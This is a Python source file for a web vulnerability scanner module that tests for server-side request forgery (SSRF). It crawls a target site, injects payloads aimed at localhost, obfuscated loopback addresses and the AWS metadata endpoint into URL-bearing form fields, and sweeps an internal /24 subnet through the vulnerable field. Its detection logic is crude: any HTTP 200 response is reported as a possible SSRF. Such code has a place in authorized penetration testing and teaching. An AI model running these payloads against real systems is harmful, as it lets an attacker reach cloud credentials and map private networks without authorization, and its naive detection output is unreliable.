import scanner,requests
from bs4 import BeautifulSoup
import validators
import urllib3
import urllib.parse as urlparse
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# List of sensitive URLs to check for SSRF
sensitive_urls = [
    "http://127.0.0.1",
    "http://127.1",
    "http://2130706433",
    "http://localhost",
    "http://169.254.169.254"  # AWS metadata
]
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
class SSRF:
    def __init__(self,vuln_scan):
        self.vuln_scan = vuln_scan

    # Function to check if the input contains a URL
    def check_for_url(self,input_value):
        return validators.url(input_value)

    # Function to extract values and names from different form elements
    def extract_values_from_form(self,form):
        input_fields = []
        # Extracting input fields
        inputs = form.find_all('input')
        for input_tag in inputs:
            name = input_tag.get('name')  # Get the name attribute
            value = input_tag.get('value')  # Get the value attribute
            action = form.get("action")
            if name and value and self.check_for_url(value):
                input_fields.append((name, value,action))

        # Extracting textarea fields
        textareas = form.find_all('textarea')
        for textarea in textareas:
            name = textarea.get('name')
            value = textarea.text.strip()
            action = form.get("action")
            if name and value and self.check_for_url(value):
                input_fields.append((name, value,action))

        # Extracting select (dropdown) fields
        selects = form.find_all('select')
        for select in selects:
            name = select.get('name')
            options = select.find_all('option')
            action = form.get("action")
            for option in options:
                value = option.get('value')
                if name and value and self.check_for_url(value):
                    input_fields.append((name, value,action))

        return input_fields

    # Function to test for SSRF vulnerability
    def test_ssrf(self, url, input_name, test_url):
        try:
            response = self.vuln_scan.session.post(url, data={input_name: test_url},verify=False,proxies=proxies)
            # Checking if the response is abnormal (indicating SSRF)
            if response.status_code == 200 :
                print(f"Potential SSRF detected with URL: {test_url}")
            else:
                print(f"No SSRF detected for URL: {test_url}")
        except requests.exceptions.RequestException as e:
            print(f"Error during request: {e}")

    def test_backend_sys(self,ip,input_name,url,port=None):
        ip_list=ip.split(".") #[192,168,0,1]

        for i in range(1,256):
            ip_list[-1] = str(i)
            ip_str = ".".join(ip_list)
            if port:
                ip_add = "http://" + ip_str + ":" + port
            else:
                ip_add = "http://" + ip_str
            try:
                response = self.vuln_scan.session.post(url, data={input_name: ip_add}, verify=False, proxies=proxies)
                if response.status_code != 500:
                    print(f"Internal back-end system private IP {ip_add} is accessible with status code {response.status_code}!")
            except requests.exceptions.RequestException as e:
                # Handle request errors (e.g., timeouts, connection errors)
                print(f"Error accessing {ip_add}: {e}")

    def run_ssrf(self):
        for link in self.vuln_scan.target_links:
            response = self.vuln_scan.session.get(link)
            parsed_html = BeautifulSoup(response.content, "lxml")
            forms = parsed_html.find_all("form")
            for form in forms:
                url_fields = self.extract_values_from_form(form)
                for input_name, value, action in url_fields:
                    print(f"Found potential URL: {value} in input: {input_name}")
                    post_url = urlparse.urljoin(self.vuln_scan.target_url, action)
                    ip_match = re.findall(r'\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}:+.\d{1,4}',value)
                    if ip_match:
                        ip_match = ip_match[0]
                        ip,port = ip_match.split(":")
                        self.test_backend_sys(ip,input_name,post_url,port)


                    for test_url in sensitive_urls:
                        self.test_ssrf(post_url, input_name, test_url)

def main():
    url = input("Enter the url : ")
    vuln_scan = scanner.Scanner(url, [])
    vuln_scan.crawl()
    ssrf = SSRF(vuln_scan)
    ssrf.run_ssrf()
if __name__ == '__main__':
    main()